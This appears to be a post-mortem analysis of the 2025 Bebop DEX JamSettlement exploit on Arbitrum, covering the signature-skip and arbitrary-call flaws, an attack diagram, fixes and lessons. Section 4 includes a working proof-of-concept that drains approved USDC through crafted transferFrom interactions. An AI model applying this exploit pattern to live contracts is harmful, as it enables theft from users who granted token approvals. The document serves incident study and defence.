# Bebop DEX — Arbitrary transferFrom Execution Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2025-08-07 |
| **Protocol** | Bebop DEX (JamSettlement) |
| **Chain** | Arbitrum |
| **Loss** | ~21,000 USD |
| **Attacker** | [0x59537353248d0b12c7fcca56a4e420ffec4abc91](https://arbiscan.io/address/0x59537353248d0b12c7fcca56a4e420ffec4abc91) |
| **Attack Tx** | [0xe5f8fe69](https://arbiscan.io/tx/0xe5f8fe69b38613a855dbcb499a2c4ecffe318c620a4c4117bd0e298213b7619d) |
| **Vulnerable Contract** | [0xbeb0b0623f66bE8cE162EbDfA2ec543A522F4ea6](https://arbiscan.io/address/0xbeb0b0623f66bE8cE162EbDfA2ec543A522F4ea6) |
| **Root Cause** | The `interactions` parameter of `JamSettlement.settle()` allows arbitrary `transferFrom` calls |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-08/Bebop_dex_exp.sol) |

---

## 1. Vulnerability Overview

The `JamSettlement` contract of Bebop DEX accepts an `interactions` array in its `settle()` function and uses it to call external contracts. Because these interactions are designed to allow calling arbitrary functions on arbitrary addresses, an attacker was able to pass an interaction encoding `USDC.transferFrom(victim, attacker, amount)` along with an empty signature, draining the USDC balances of any victim who had approved the contract.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable logic: interactions allow arbitrary external calls
contract JamSettlement {
    function settle(
        JamOrder calldata order,
        bytes calldata signature,
        JamInteraction[] calldata interactions,
        bytes memory hooksData,
        address balanceRecipient
    ) external payable {
        // Signature verification accepts empty signatures or can be bypassed
        _verifyOrder(order, signature);

        // interactions executed without validation
        for (uint256 i = 0; i < interactions.length; i++) {
            // ❌ No restrictions on the `to` address or `data` content
            (bool success,) = interactions[i].to.call{value: interactions[i].value}(
                interactions[i].data
            );
            if (!interactions[i].result) require(success);
        }
    }
}

// ✅ Fix: whitelist permitted calls within interactions
function settle(...) external payable {
    for (uint256 i = 0; i < interactions.length; i++) {
        // Block interactions that directly call transferFrom
        bytes4 selector = bytes4(interactions[i].data);
        require(selector != IERC20.transferFrom.selector, "transferFrom not allowed");
        require(isWhitelistedTarget[interactions[i].to], "Target not whitelisted");
        ...
    }
}
```

### On-Chain Source Code

> ⚠️ Contract not verified on Sourcify — Sourcify returns 404 for 0xbeb0b0623f66bE8cE162EbDfA2ec543A522F4ea6 on Arbitrum (chainid 42161). The source below is from the **public Bebop JAM contracts repository** (https://github.com/bebop-dex/bebop-jam-contracts), which matches the deployed bytecode per the Bebop post-mortem and the DeFiHackLabs PoC.

```solidity
// JamSettlement.sol — Bebop JAM contracts (Solidity ^0.8.27, UNLICENSED)
// Arbitrum deployment: 0xbeb0b0623f66bE8cE162EbDfA2ec543A522F4ea6

function settle(
    JamOrder calldata order,
    bytes calldata signature,
    JamInteraction.Data[] calldata interactions,
    bytes memory hooksData,
    address balanceRecipient
) external payable nonReentrant {
    JamHooks.Def memory hooks = hooksData.length != 0 ?
        abi.decode(hooksData, (JamHooks.Def)) :
        JamHooks.Def(new JamInteraction.Data[](0), new JamInteraction.Data[](0));
    bytes32 hooksHash = hooksData.length != 0 ? JamHooks.hash(hooks) : JamHooks.EMPTY_HOOKS_HASH;

    validateOrder(order, signature, hooksHash); // ❌ skipped when order.taker == msg.sender (see below)

    if (hooksHash != JamHooks.EMPTY_HOOKS_HASH){
        require(JamInteraction.runInteractionsM(hooks.beforeSettle, balanceManager), BeforeSettleHooksFailed());
    }
    if (order.usingPermit2) {
        balanceManager.transferTokensWithPermit2(order, signature, hooksHash, balanceRecipient);
    } else {
        balanceManager.transferTokens(order.sellTokens, order.sellAmounts, order.taker, balanceRecipient);
    }

    require(JamInteraction.runInteractions(interactions, balanceManager), InteractionsFailed()); // ❌ arbitrary calls executed

    uint256[] memory buyAmounts = order.buyAmounts;
    transferTokensFromContract(order.buyTokens, order.buyAmounts, buyAmounts, order.receiver, order.partnerInfo, false);
    // ...
}

// JamValidation.sol — validateOrder()
function validateOrder(JamOrder calldata order, bytes calldata signature, bytes32 hooksHash) internal {
    // ❌ KEY BYPASS: if order.taker == msg.sender, NO signature is required
    if (order.taker != msg.sender && !order.usingPermit2) {
        bytes32 orderHash = keccak256(abi.encodePacked("\x19\x01", DOMAIN_SEPARATOR(), order.hash(hooksHash)));
        validateSignature(order.taker, orderHash, signature);
    }
    // ... nonce, executor, expiry checks ...
}

// JamInteraction.sol — runInteractions() (the core vulnerable function)
library JamInteraction {
    struct Data {
        bool result;   // if true, revert on failure; if false, ignore failure
        address to;    // ❌ arbitrary target address — any contract on Arbitrum
        uint256 value;
        bytes data;    // ❌ arbitrary calldata — including USDC.transferFrom(victim, attacker, amount)
    }

    function runInteractions(Data[] calldata interactions, IJamBalanceManager balanceManager) internal returns (bool) {
        for (uint i; i < interactions.length; ++i) {
            Data calldata interaction = interactions[i];
            require(interaction.to != address(balanceManager), CallToBalanceManagerNotAllowed()); // only balanceManager is blocked
            (bool execResult,) = payable(interaction.to).call{ value: interaction.value }(interaction.data); // ❌ arbitrary external call
            if (!execResult && interaction.result) return false;
        }
        return true;
    }
}
```

**Why it is exploitable (identify the bug from the code):**

- `validateOrder()` skips signature verification entirely when `order.taker == msg.sender`. The attacker simply sets `order.taker = address(this)` (their own contract) and calls `settle()` — no valid signature required.
- `runInteractions()` blocks only calls to `balanceManager` but permits calls to **any other address** with **any calldata**. The attacker passes `interaction.to = USDC`, `interaction.data = abi.encodeCall(IERC20.transferFrom, (victim, attacker, amount))`.
- Because `JamSettlement` is an approved spender for victims' USDC (users had approved the settlement contract for trading), `USDC.transferFrom(victim, attacker, amount)` succeeds and drains each victim's balance.
- The `sellTokens` / `buyTokens` arrays in the order can be empty — no actual swap is needed; the exploit lives entirely in the `interactions` array.

```solidity
// ✅ Fix: block transferFrom selector and restrict interaction targets
function runInteractions(Data[] calldata interactions, IJamBalanceManager balanceManager) internal returns (bool) {
    for (uint i; i < interactions.length; ++i) {
        Data calldata interaction = interactions[i];
        require(interaction.to != address(balanceManager), CallToBalanceManagerNotAllowed());
        // ✅ Block direct ERC-20 transferFrom calls via interactions
        if (interaction.data.length >= 4) {
            bytes4 selector = bytes4(interaction.data[:4]);
            require(selector != IERC20.transferFrom.selector, "transferFrom not allowed in interactions");
        }
        (bool execResult,) = payable(interaction.to).call{ value: interaction.value }(interaction.data);
        if (!execResult && interaction.result) return false;
    }
    return true;
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ Construct JamSettlement.settle() call
  │         ├─ order: taker=attacker, empty sellTokens/buyTokens
  │         ├─ signature: empty bytes (bypass verification)
  │         └─ interactions:
  │               [0] USDC.transferFrom(victim1, attacker, 20,134,500,015)
  │               [1] USDC.transferFrom(victim2, attacker, 1,000,000)
  │
  ├─2─▶ JamSettlement: execute interactions in order
  │         └─ USDC.transferFrom called twice
  │         └─ Drain balances of all addresses that approved JamSettlement for USDC
  │
  └─3─▶ ~21,000 USD worth of USDC drained successfully
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract Bebop is BaseTestWithBalanceLog {
    function testExploit() public balanceLog {
        // Construct empty order (taker=attacker, no tokens)
        JamOrder memory order = JamOrder({
            taker: address(this),
            receiver: address(this),
            expiry: 1754987701,
            exclusivityDeadline: 0,
            nonce: 1,
            executor: address(this),
            partnerInfo: 0,
            sellTokens: new address[](0),  // no sell tokens
            buyTokens: new address[](0),   // no buy tokens
            sellAmounts: new uint256[](0),
            buyAmounts: new uint256[](0),
            usingPermit2: false
        });

        bytes memory signature = hex""; // empty signature — bypasses verification

        // Construct interaction to drain victim 1's USDC
        bytes memory interaction1Data = abi.encodeCall(
            IERC20.transferFrom,
            (victim1, address(this), 20_134_500_015) // ~20,134 USDC
        );

        // Construct interaction to drain victim 2's USDC
        bytes memory interaction2Data = abi.encodeCall(
            IERC20.transferFrom,
            (victim2, address(this), 1_000_000) // ~1 USDC
        );

        JamInteraction[] memory interactions = new JamInteraction[](2);
        interactions[0] = JamInteraction({result: false, to: usdc, value: 0, data: interaction1Data});
        interactions[1] = JamInteraction({result: false, to: usdc, value: 0, data: interaction2Data});

        // Call settle — interactions execute and drain USDC
        jamContract.settle(order, signature, interactions, hex"", address(this));
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Arbitrary External Call |
| **Attack Vector** | Arbitrary `transferFrom` execution via the `interactions` parameter |
| **Impact Scope** | All addresses that approved USDC to JamSettlement (~21,000 USD) |
| **CWE** | CWE-284 (Improper Access Control) |
| **DASP** | Access Control |

## 6. Remediation Recommendations

1. **Block direct `transferFrom` calls**: Prohibit use of the ERC20 `transferFrom` selector within interactions
2. **Whitelist permitted targets**: Restrict the `to` address in interactions to a pre-approved set of addresses
3. **Enforce strict signature validation**: Prevent `settle` from being called with an empty or invalid signature
4. **Minimize approval scope**: Guide users to approve only the exact amount required to JamSettlement, rather than unlimited approvals

## 7. Lessons Learned

- "Settlement contracts" are inherently designed to move tokens on behalf of users — allowing arbitrary execution of interactions or calldata exposes every approved token to risk.
- Accepting an empty signature renders signature verification meaningless — signature checks must be strictly enforced.
- The common practice of users granting unlimited approvals to DEX contracts maximizes damage when vulnerabilities like this are exploited.